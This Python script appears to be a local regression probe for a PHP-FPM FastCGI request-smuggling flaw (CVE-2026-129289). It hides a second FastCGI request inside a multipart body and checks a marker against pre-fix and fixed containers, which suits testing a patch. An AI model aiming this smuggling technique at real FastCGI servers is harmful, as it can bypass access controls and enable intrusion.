#!/usr/bin/env python3

"""Local-only, fixed-marker regression probe for CVE-2026-129289."""

import socket
import struct
import sys
import time

PORT = 9000
SCRIPT = "/var/www/html/target.php"
BODY_SIZE = 12000
HIDDEN_OFFSET = 5120
MARKER = b"SMUGGLED_MARKER"


def encode_length(length):
    if length < 128:
        return bytes((length,))
    return struct.pack("!I", length | 0x80000000)


def encode_params(params):
    result = bytearray()

    for name, value in params.items():
        key = name.encode()
        val = value.encode()

        result += encode_length(len(key))
        result += encode_length(len(val))
        result += key + val

    return bytes(result)


def record(record_type, content, request_id):
    header = struct.pack(
        "!BBHHBB",
        1,
        record_type,
        request_id,
        len(content),
        0,
        0,
    )
    return header + content


def fcgi_request(request_id, keep, params, body):
    begin = struct.pack("!HB5x", 1, int(keep))

    return (
        record(1, begin, request_id)
        + record(4, encode_params(params), request_id)
        + record(4, b"", request_id)
        + record(5, body, request_id)
        + record(5, b"", request_id)
    )


def wait_for_service(host):
    deadline = time.monotonic() + 20
    last_error = None

    while time.monotonic() < deadline:
        try:
            with socket.create_connection(
                (host, PORT), timeout=1
            ):
                return
        except OSError as exc:
            last_error = exc
            time.sleep(0.25)

    raise RuntimeError(
        f"{host} did not become ready: {last_error}"
    )


def transact(host, payload):
    with socket.create_connection(
        (host, PORT), timeout=5
    ) as sock:
        sock.settimeout(4)
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)

        chunks = []

        while True:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                break

            if not chunk:
                break

            chunks.append(chunk)

        return b"".join(chunks)


def make_outer_request(keep):
    hidden_params = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "GET",
        "SCRIPT_FILENAME": SCRIPT,
        "SCRIPT_NAME": "/smuggled.php",
        "REQUEST_URI": "/smuggled.php",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REMOTE_ADDR": "203.0.113.1",
        "CONTENT_LENGTH": "0",
    }

    hidden = fcgi_request(2, False, hidden_params, b"")

    prefix = (
        b"--B\r\n"
        b"Content-Disposition: form-data\r\n"
        b"\r\n"
    )

    body = bytearray(prefix.ljust(BODY_SIZE, b"A"))

    end = HIDDEN_OFFSET + len(hidden)

    if end > BODY_SIZE:
        raise RuntimeError("Hidden regression frame is too large")

    body[HIDDEN_OFFSET:end] = hidden

    outer_params = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": SCRIPT,
        "SCRIPT_NAME": "/open.php",
        "REQUEST_URI": "/open.php",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REMOTE_ADDR": "127.0.0.1",
        "CONTENT_TYPE": "multipart/form-data; boundary=B",
        "CONTENT_LENGTH": str(len(body)),
    }

    return fcgi_request(
        1, keep, outer_params, bytes(body)
    )


def observe(host, keep):
    response = transact(host, make_outer_request(keep))
    return MARKER in response


def main():
    services = {
        "pre-fix 8.5.12": "php-pre-november-fix",
        "fixed 8.5.13": "php-november-fixed",
    }

    observations = {}

    for label, host in services.items():
        wait_for_service(host)
        observations[label] = {}

        for keep in (False, True):
            found = observe(host, keep)
            observations[label][keep] = found

            result = (
                "MARKER OBSERVED"
                if found
                else "no marker"
            )

            print(
                f"{label}: FCGI_KEEP_CONN={int(keep)} "
                f"-> {result}"
            )

    vulnerable_ok = (
        observations["pre-fix 8.5.12"]
        == {False: False, True: True}
    )

    patched_ok = (
        observations["fixed 8.5.13"]
        == {False: False, True: False}
    )

    if vulnerable_ok and patched_ok:
        print(
            "\nPASS: request-boundary regression reproduced "
            "and patched comparison passed."
        )
        return 0

    print(
        "\nINCONCLUSIVE: observed behavior differs "
        "from expected results.",
        file=sys.stderr,
    )
    print(
        "Check image versions and PHP-FPM logs.",
        file=sys.stderr,
    )
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
